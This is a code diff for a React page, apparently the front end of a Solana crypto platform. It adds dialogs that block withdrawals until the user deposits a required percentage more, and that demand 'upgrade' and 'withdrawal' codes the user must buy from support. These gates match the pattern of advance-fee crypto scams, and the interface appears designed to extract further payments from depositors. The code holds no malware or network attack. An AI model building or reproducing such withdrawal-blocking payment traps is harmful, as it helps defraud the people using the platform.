+                    </p>
+                  </div>
+                </div>
+
+                <div className="grid gap-4">
+                  <div className="bg-[#050d1a] border border-blue-900/30 rounded-xl p-4">
+                    <div className="flex items-center justify-between">
+                      <span className="text-gray-400 text-sm">Your Current Balance</span>
+                      <div className="flex items-center gap-2">
+                        <span className="text-white font-bold text-lg">{balance.toFixed(4)} SOL</span>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div className="bg-[#050d1a] border border-blue-900/30 rounded-xl p-4">
+                    <div className="flex items-center justify-between">
+                      <span className="text-gray-400 text-sm">Total Deposited</span>
+                      <div className="flex items-center gap-2">
+                        <span className="text-blue-400 font-bold text-lg">{totalDepositedSOL.toFixed(4)} SOL</span>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div className="bg-[#050d1a] border border-blue-900/30 rounded-xl p-4">
+                    <div className="flex items-center justify-between">
+                      <span className="text-gray-400 text-sm">Required Deposit ({requiredDepositPercentage}%)</span>
+                      <div className="flex items-center gap-2">
+                        <span className="text-white font-bold text-lg">{requiredDepositForWithdrawal.toFixed(4)} SOL</span>
+                      </div>
+                    </div>
+                  </div>
+
+                  <div className="bg-gradient-to-r from-blue-900/30 to-blue-800/20 border border-blue-500/30 rounded-xl p-4">
+                    <div className="flex items-center justify-between">
+                      <span className="text-blue-300 text-sm font-medium">Amount Needed to Deposit</span>
+                      <div className="flex items-center gap-2">
+                        <span className="text-blue-300 font-bold text-xl">{depositShortfall.toFixed(4)} SOL</span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div className="px-6 pb-6 flex gap-3">
+                <Button
+                  onClick={() => setShowDepositRequiredDialog(false)}
+                  variant="outline"
+                  className="flex-1 border-gray-600 text-gray-300 hover:bg-blue-900/20 bg-transparent h-12"
+                >
+                  <X className="w-4 h-4 mr-2" />
+                  Close
+                </Button>
+                <Button
+                  onClick={() => {
+                    setShowDepositRequiredDialog(false)
+                    handleDeposit()
+                  }}
+                  className="flex-1 bg-blue-700 hover:bg-blue-800 text-white h-12 font-semibold"
+                >
+                  <ArrowDownRight className="w-4 h-4 mr-2" />
+                  Deposit Now
+                </Button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Upgrade Code Dialog */}
+      {showUpgradeCodeDialog && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm px-4">
+          <div className="w-full max-w-md bg-[#050d1a] border border-blue-500/30 rounded-2xl p-8 shadow-2xl">
+            <div className="flex items-center justify-between mb-6">
+              <div className="flex items-center gap-3">
+                <div className="w-12 h-12 bg-blue-900/30 border border-blue-500/30 rounded-xl flex items-center justify-center">
+                  <ArrowUpCircle className="w-6 h-6 text-blue-400" />
+                </div>
+                <div>
+                  <h3 className="text-xl font-bold text-white">Upgrade Required</h3>
+                  <p className="text-gray-400 text-sm">Enter your upgrade code to proceed</p>
+                </div>
+              </div>
+              <button
+                onClick={() => setShowUpgradeCodeDialog(false)}
+                className="p-2 hover:bg-blue-900/20 rounded-lg transition-colors"
+                aria-label="Close dialog"
+              >
+                <X className="w-5 h-5 text-gray-400" />
+              </button>
+            </div>
+
+            <div className="mb-4 p-4 bg-amber-900/20 border border-amber-500/30 rounded-lg">
+              <div className="flex items-start gap-2">
+                <AlertCircle className="w-5 h-5 text-amber-400 mt-0.5 shrink-0" />
+                <p className="text-amber-300 text-sm">
+                  An upgrade code is required to process withdrawals. Please contact support to purchase an upgrade code.
+                </p>
+              </div>
+            </div>
+
+            <div className="mb-6">
+              <label htmlFor="upgradeCode" className="block text-sm font-medium text-gray-300 mb-2">
+                Upgrade Code
+              </label>
+              <input
+                type="text"
+                id="upgradeCode"
+                value={upgradeCodeEntry}
+                onChange={(e) => { setUpgradeCodeEntry(e.target.value); setCodeError("") }}
+                className="w-full px-4 py-3 bg-[#0a1628] border border-blue-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
+                placeholder="Enter upgrade code"
+                autoFocus
+              />
+              {codeError && (
+                <p className="mt-2 text-sm text-red-400 flex items-center gap-1">
+                  <AlertCircle className="w-4 h-4" />
+                  {codeError}
+                </p>
+              )}
+            </div>
+
+            <div className="flex gap-3">
+              <Button
+                onClick={() => setShowUpgradeCodeDialog(false)}
+                variant="outline"
+                className="flex-1 border-gray-600 text-gray-300 hover:bg-blue-900/20 bg-transparent"
+              >
+                Cancel
+              </Button>
+              <Button onClick={handleUpgradeCodeSubmit} className="flex-1 bg-blue-700 hover:bg-blue-800 text-white">
+                <KeyRound className="w-4 h-4 mr-2" />
+                Verify Code
+              </Button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Withdrawal Code Dialog */}
+      {showWithdrawalCodeDialog && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm px-4">
+          <div className="w-full max-w-md bg-[#050d1a] border border-blue-500/30 rounded-2xl p-8 shadow-2xl">
+            <div className="flex items-center justify-between mb-6">
+              <div className="flex items-center gap-3">
+                <div className="w-12 h-12 bg-blue-900/30 border border-blue-500/30 rounded-xl flex items-center justify-center">
+                  <KeyRound className="w-6 h-6 text-blue-400" />
+                </div>
+                <div>
+                  <h3 className="text-xl font-bold text-white">Withdrawal Code Required</h3>
+                  <p className="text-gray-400 text-sm">Enter your withdrawal code to proceed</p>
+                </div>
+              </div>
+              <button
+                onClick={() => setShowWithdrawalCodeDialog(false)}
+                className="p-2 hover:bg-blue-900/20 rounded-lg transition-colors"
+                aria-label="Close dialog"
+              >
+                <X className="w-5 h-5 text-gray-400" />
+              </button>
+            </div>
+
+            <div className="mb-4 p-4 bg-amber-900/20 border border-amber-500/30 rounded-lg">
+              <div className="flex items-start gap-2">
+                <AlertCircle className="w-5 h-5 text-amber-400 mt-0.5 shrink-0" />
+                <p className="text-amber-300 text-sm">
+                  A withdrawal code is required to process this withdrawal. Please contact support to purchase a
+                  withdrawal code.
+                </p>
+              </div>
+            </div>
+
+            <div className="mb-6">
+              <label htmlFor="withdrawalCode" className="block text-sm font-medium text-gray-300 mb-2">
+                Withdrawal Code
+              </label>
+              <input
+                type="text"
+                id="withdrawalCode"
+                value={withdrawalCodeEntry}
+                onChange={(e) => { setWithdrawalCodeEntry(e.target.value); setCodeError("") }}
+                className="w-full px-4 py-3 bg-[#0a1628] border border-blue-500/30 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
+                placeholder="Enter withdrawal code"
+                autoFocus
+              />
+              {codeError && (
+                <p className="mt-2 text-sm text-red-400 flex items-center gap-1">
+                  <AlertCircle className="w-4 h-4" />
+                  {codeError}
+                </p>
+              )}
+            </div>
+
+            <div className="flex gap-3">
+              <Button
+                onClick={() => setShowWithdrawalCodeDialog(false)}
+                variant="outline"
+                className="flex-1 border-gray-600 text-gray-300 hover:bg-blue-900/20 bg-transparent"
+              >
+                Cancel
+              </Button>
+              <Button onClick={handleWithdrawalCodeSubmit} className="flex-1 bg-blue-700 hover:bg-blue-800 text-white">
+                <KeyRound className="w-4 h-4 mr-2" />
+                Verify Code
+              </Button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   )
 }
-
-export default page
-
-
-
- 
